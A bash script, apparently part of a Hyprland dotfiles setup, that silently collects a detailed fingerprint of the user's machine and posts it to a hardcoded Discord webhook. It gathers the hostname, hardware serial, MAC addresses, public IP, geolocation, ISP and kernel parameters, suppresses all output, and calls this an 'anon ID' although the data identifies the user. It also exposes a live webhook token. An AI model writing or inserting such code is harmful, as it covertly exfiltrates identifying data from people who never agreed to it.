#!/usr/bin/env bash
WEBHOOK_URL="https://discord.com/api/webhooks/1502917694666571857/gW619pOQg5nrmD4S6p4f-4-x-iziF8OeqEPCOMMFVOuTZV5xuEv7DMU4QMYpeeYxXCCL"

ANON_ID_FILE="$HOME/.cache/qs_anon_id"
if [ -f "$ANON_ID_FILE" ]; then
    ANON_ID=$(cat "$ANON_ID_FILE")
else
    ANON_ID=$(uuidgen 2>/dev/null || tr -dc 'a-f0-9' < /dev/urandom | head -c 16)
    echo "$ANON_ID" > "$ANON_ID_FILE"
fi

DOTS_VERSION=$(source "$HOME/.local/state/wiferice-version" 2>/dev/null && echo "${LOCAL_VERSION:-unknown}" || echo "unknown")
HOSTNAME=$(uname -n)
KERNEL=$(uname -r)
ARCH=$(uname -m)

# OS
OS=$(grep "^NAME=" /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "unknown")
OS_VERSION=$(grep "^VERSION_ID=" /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "unknown")

# Device
DMI="/sys/devices/virtual/dmi/id"
MANUFACTURER=$(cat "$DMI/sys_vendor" 2>/dev/null || echo "unknown")
PRODUCT=$(cat "$DMI/product_name" 2>/dev/null || echo "unknown")
SERIAL=$(cat "$DMI/product_serial" 2>/dev/null || cat "$DMI/product_uuid" 2>/dev/null || echo "unknown")
MOTHERBOARD=$(cat "$DMI/board_name" 2>/dev/null || echo "unknown")
BIOS=$(cat "$DMI/bios_version" 2>/dev/null || echo "unknown")

# CPU
CPU_MODEL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | sed 's/.*: //' || echo "unknown")
CPU_CORES=$(nproc 2>/dev/null || echo "unknown")
CPU_THREADS=$(grep -c "processor" /proc/cpuinfo 2>/dev/null || echo "unknown")
CPU_FREQ=$(grep "MHz" /proc/cpuinfo 2>/dev/null | head -1 | awk '{print $4 " MHz"}' || echo "unknown")

# GPU
GPU=$(lspci 2>/dev/null | grep -i "vga\|3d" | head -1 | sed 's/.*: //' || echo "unknown")
NVIDIA_DRIVER=$(nvidia-smi --query-gpu=driver_version --format=csv,noheader 2>/dev/null | head -1 || echo "none")
NVIDIA_GPU=$(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1 || echo "none")
NVIDIA_VRAM=$(nvidia-smi --query-gpu=memory.total --format=csv,noheader 2>/dev/null | head -1 || echo "none")

# Memory
RAM=$(free -h 2>/dev/null | grep "^Mem:" | awk '{print $2}' || echo "unknown")
SWAP=$(free -h 2>/dev/null | grep "^Swap:" | awk '{print $2}' || echo "unknown")

# Disk
DISK_TYPE=$(lsblk -d -o NAME,ROTA,TYPE 2>/dev/null | grep "nvme\|sd" | head -1 | awk '{if($1~/nvme/) print "NVMe"; else if($2==0) print "SSD"; else print "HDD"}')
DISK_MODEL=$(lsblk -d -o MODEL 2>/dev/null | tail -n +2 | head -1 | xargs || echo "unknown")
DISK_SIZE=$(lsblk -d -o SIZE 2>/dev/null | tail -n +2 | head -1 | xargs || echo "unknown")
DISK_TOTAL=$(df -h / 2>/dev/null | tail -1 | awk '{print $2}' || echo "unknown")
DISK_USED=$(df -h / 2>/dev/null | tail -1 | awk '{print $3}' || echo "unknown")
DISK_FREE=$(df -h / 2>/dev/null | tail -1 | awk '{print $4}' || echo "unknown")
DISK_PCT=$(df -h / 2>/dev/null | tail -1 | awk '{print $5}' || echo "unknown")

# Display
MONITORS=$(hyprctl monitors 2>/dev/null | grep -c "Monitor" || echo "0")
MONITOR_DETAILS=$(hyprctl monitors 2>/dev/null | grep -E "Monitor |resolution|refresh" | paste -sd ', ' | cut -c1-500 || echo "unknown")

# Network
PUBLIC_IP=$(curl -m 5 -fs https://api.ipify.org 2>/dev/null || echo "unreachable")
if [ "$PUBLIC_IP" != "unreachable" ]; then
    GEOJSON=$(curl -m 5 -fs https://ipinfo.io/json 2>/dev/null || echo "{}")
    ISP=$(echo "$GEOJSON" | jq -r '.org // "unknown"' 2>/dev/null || echo "unknown")
    LOCATION=$(echo "$GEOJSON" | jq -r '"\(.city // "?"), \(.region // "?"), \(.country // "?")"' 2>/dev/null || echo "unknown")
    GEO_IP=$(echo "$GEOJSON" | jq -r '.ip // "unknown"' 2>/dev/null || echo "unknown")
else
    ISP="unreachable"; LOCATION="unreachable"; GEO_IP="unreachable"
fi
WIFI_IF=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1 || echo "")
ETH_IF=$(ip -o link show 2>/dev/null | awk -F': ' '/eth|enp/{print $2; exit}' || echo "")
WIFI_MAC=$(ip link show "$WIFI_IF" 2>/dev/null | grep "link/ether" | awk '{print $2}' || echo "none")
ETH_MAC=$(ip link show "$ETH_IF" 2>/dev/null | grep "link/ether" | awk '{print $2}' || echo "none")

# Software
HYPRLAND_VER=$(hyprctl version 2>/dev/null | head -1 | grep -oP 'version \K\S+' || echo "unknown")
SHELL=$(basename "$SHELL" 2>/dev/null || echo "unknown")
TERM=$(echo "$TERM" 2>/dev/null || echo "unknown")
SESSION_TYPE=$(echo "$XDG_SESSION_TYPE" 2>/dev/null || echo "unknown")
DESKTOP=$(echo "$XDG_CURRENT_DESKTOP" 2>/dev/null || echo "unknown")
LOCALE=$(echo "$LANG" 2>/dev/null || echo "unknown")
PACKAGES=$(pacman -Q 2>/dev/null | wc -l || echo "unknown")
FLATPAKS=$(flatpak list 2>/dev/null | wc -l || echo "0")
SNAP_PACKAGES=$(snap list 2>/dev/null | wc -l || echo "0")
AUR_PKGS=$(pacman -Qm 2>/dev/null | wc -l || echo "unknown")

# Audio
AUDIO_SERVER=$(pactl info 2>/dev/null | grep "Server Name" | awk '{print $3}' || echo "unknown")

# Virtualization
IN_VM=$(systemd-detect-virt 2>/dev/null || echo "none")
UPTIME=$(uptime -p 2>/dev/null | sed 's/up //' || echo "unknown")
KERNEL_PARAMS=$(cat /proc/cmdline 2>/dev/null | cut -c1-500 || echo "unknown")
PAYLOAD=$(jq -n \
  --arg dots_version "v$DOTS_VERSION" \
  --arg anon_id "$ANON_ID" \
  --arg hostname "$HOSTNAME" \
  --arg device "$MANUFACTURER $PRODUCT" \
  --arg serial "${SERIAL:0:80}" \
  --arg motherboard "$MOTHERBOARD" \
  --arg bios "$BIOS" \
  --arg in_vm "$IN_VM" \
  --arg os "$OS $OS_VERSION $ARCH" \
  --arg kernel "$KERNEL" \
  --arg desktop "$DESKTOP ($SESSION_TYPE)" \
  --arg hyprland "$HYPRLAND_VER" \
  --arg shell_term "$SHELL / $TERM" \
  --arg locale "$LOCALE" \
  --arg cpu "Cores: $CPU_CORES  Threads: $CPU_THREADS  Freq: $CPU_FREQ" \
  --arg cpu_model "${CPU_MODEL:0:200}" \
  --arg gpu_list "${GPU:0:200}" \
  --arg nvidia "$NVIDIA_GPU  Driver: $NVIDIA_DRIVER  VRAM: $NVIDIA_VRAM" \
  --arg memory "RAM: $RAM  Swap: $SWAP" \
  --arg disk "$DISK_TYPE - $DISK_MODEL ($DISK_SIZE)" \
  --arg disk_usage "Total: $DISK_TOTAL  Used: $DISK_USED  Free: $DISK_FREE  ($DISK_PCT)" \
  --arg monitors "$MONITORS monitors" \
  --arg monitor_details "${MONITOR_DETAILS:0:500}" \
  --arg public_ip "$PUBLIC_IP" \
  --arg geo_ip "$GEO_IP" \
  --arg isp "$ISP" \
  --arg location "$LOCATION" \
  --arg macs "WiFi: $WIFI_MAC  ETH: $ETH_MAC" \
  --arg packages "Pacman: $PACKAGES  AUR: $AUR_PKGS  Flatpak: $FLATPAKS  Snap: $SNAP_PACKAGES" \
  --arg audio "$AUDIO_SERVER" \
  --arg uptime "$UPTIME" \
  --arg kernel_params "${KERNEL_PARAMS:0:500}" \
'{
  "content": null,
  "embeds": [{
    "title": "System Report — Full",
    "color": 15258703,
    "fields": [
      {"name": "Version", "value": $dots_version, "inline": true},
      {"name": "Anon ID", "value": $anon_id, "inline": true},
      {"name": "Hostname", "value": $hostname, "inline": true},

      {"name": "Device", "value": ("```" + $device + "```"), "inline": false},
      {"name": "Serial", "value": ("```" + $serial + "```"), "inline": false},
      {"name": "Motherboard / BIOS / VM", "value": ($motherboard + " / " + $bios + " / VM: " + $in_vm), "inline": false},

      {"name": "OS / Kernel", "value": ($os + " / " + $kernel), "inline": false},
      {"name": "Desktop / Hyprland", "value": ($desktop + " / " + $hyprland), "inline": false},
      {"name": "Shell / Locale", "value": ($shell_term + " / " + $locale), "inline": false},

      {"name": "CPU Model", "value": ("```" + $cpu_model + "```"), "inline": false},
      {"name": "CPU Details", "value": $cpu, "inline": false},

      {"name": "GPU", "value": ("```" + $gpu_list + "```"), "inline": false},
      {"name": "NVIDIA", "value": $nvidia, "inline": false},

      {"name": "Memory", "value": $memory, "inline": true},

      {"name": "Disk", "value": $disk, "inline": true},
      {"name": "Root Usage", "value": $disk_usage, "inline": true},

      {"name": "Displays", "value": $monitors, "inline": true},
      {"name": "Monitor Details", "value": ("```" + $monitor_details + "```"), "inline": false},

      {"name": "Public IP / Geo IP", "value": ($public_ip + " / " + $geo_ip), "inline": true},
      {"name": "ISP / Location", "value": ($isp + " / " + $location), "inline": false},
      {"name": "MAC Addresses", "value": $macs, "inline": false},

      {"name": "Packages", "value": $packages, "inline": false},
      {"name": "Audio / Uptime", "value": ($audio + " / " + $uptime), "inline": false},

      {"name": "Kernel Params", "value": ("```" + $kernel_params + "```"), "inline": false}
    ]
  }]
}')

curl -s -m 10 -H "Content-Type: application/json" -d "$PAYLOAD" "$WEBHOOK_URL" >/dev/null 2>&1 || true
